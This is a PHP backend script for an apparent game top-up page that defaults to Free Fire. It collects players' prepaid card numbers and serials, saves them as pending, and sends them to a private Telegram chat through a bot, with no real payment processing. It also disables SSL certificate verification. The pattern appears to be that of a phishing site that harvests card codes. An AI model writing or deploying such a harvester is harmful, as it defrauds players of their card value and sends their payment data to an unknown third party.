<?php

header('Content-Type: application/json; charset=utf-8');

require_once 'env.php';
require_once 'license.php';

if ($_SERVER["REQUEST_METHOD"] !== "POST") {

    http_response_code(405);

    echo json_encode([
        "status" => "error",
        "message" => "Method not allowed"
    ]);

    exit;
}

$input = file_get_contents('php://input');

$data = json_decode($input, true) ?? $_POST;

// ================= VALIDATE =================
if (
    empty($data['userId']) ||
    empty($data['value']) ||
    empty($data['provider'])
) {

    http_response_code(400);

    echo json_encode([
        "status" => "error",
        "message" => "Thiếu thông tin"
    ]);

    exit;
}

// ================= SAVE DATABASE =================
try {

    $stmt = $pdo->prepare("
        INSERT INTO transactions (
            game,
            user_id,
            package,
            value,
            provider,
            card_number,
            serial_number,
            status,
            created_at
        )
        VALUES (
            :game,
            :user_id,
            :package,
            :value,
            :provider,
            :card_number,
            :serial_number,
            'pending',
            NOW()
        )
    ");

    $stmt->execute([

        ':game' =>
            $data['game'] ?? 'Unknown',

        ':user_id' =>
            $data['userId'] ?? '',

        ':package' =>
            $data['package'] ?? '',

        ':value' =>
            $data['value'] ?? '',

        ':provider' =>
            $data['provider'] ?? '',

        ':card_number' =>
            $data['cardNumber'] ?? '',

        ':serial_number' =>
            $data['serialNumber'] ?? ''
    ]);

} catch (PDOException $e) {

    file_put_contents(
        'db_error_log.txt',
        date('Y-m-d H:i:s') .
        ' | ' .
        $e->getMessage() .
        PHP_EOL,
        FILE_APPEND
    );
}

// ================= ESCAPE MARKDOWN =================
function escapeMD($text) {

    $text = (string)$text;

    $replace = [
        '_', '*', '[', ']',
        '(', ')', '~', '`',
        '>', '#', '+', '-',
        '=', '|', '{', '}',
        '.', '!'
    ];

    foreach ($replace as $char) {

        $text = str_replace(
            $char,
            '\\' . $char,
            $text
        );
    }

    return $text;
}

// ================= TELEGRAM MESSAGE =================
$message = "🎮 *THÔNG TIN NẠP GAME* 🎮\n\n";

$message .=
    "🎯 *Game*: " .
    escapeMD($data['game'] ?? 'Free Fire') .
    "\n";

$message .=
    "👤 *UID*: " .
    escapeMD($data['userId']) .
    "\n";

$message .=
    "💎 *Gói*: " .
    escapeMD($data['value']) .
    "\n";

$message .=
    "💳 *Phương thức*: " .
    escapeMD($data['provider']) .
    "\n";

if ($data['provider'] === "qr") {

    $message .=
        "✅ *Hình thức*: Thanh toán QR Code\n";

} else {

    $message .=
        "🔢 *Mã thẻ*: `" .
        escapeMD($data['cardNumber'] ?? 'N/A') .
        "`\n";

    $message .=
        "📋 *Seri*: `" .
        escapeMD($data['serialNumber'] ?? 'N/A') .
        "`\n";
}

$message .=
    "⏰ *Thời gian*: " .
    date("d/m/Y H:i:s");

// ================= SEND TELEGRAM =================
$url =
    "https://api.telegram.org/bot" .
    $_ENV['BOT_TOKEN'] .
    "/sendMessage";

$postData = [

    'chat_id' =>
        $_ENV['CHAT_ID'],

    'text' =>
        $message,

    'parse_mode' =>
        'MarkdownV2'
];

$ch = curl_init($url);

curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

curl_setopt($ch, CURLOPT_POST, true);

curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);

curl_setopt($ch, CURLOPT_TIMEOUT, 15);

curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

$response = curl_exec($ch);

$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);

curl_close($ch);

// ================= LOG =================
file_put_contents(
    "telegram_log.txt",

    date("Y-m-d H:i:s") .
    " | HTTP: $httpCode | UID: " .
    ($data['userId'] ?? '') .
    "\n",

    FILE_APPEND
);

// ================= RESPONSE =================
if ($httpCode === 200) {

    echo json_encode([
        "status" => "success",
        "message" => "Giao dịch đã được gửi thành công!"
    ]);

} else {

    echo json_encode([
        "status" => "error",
        "message" => "Lỗi khi gửi thông tin"
    ]);
}
?>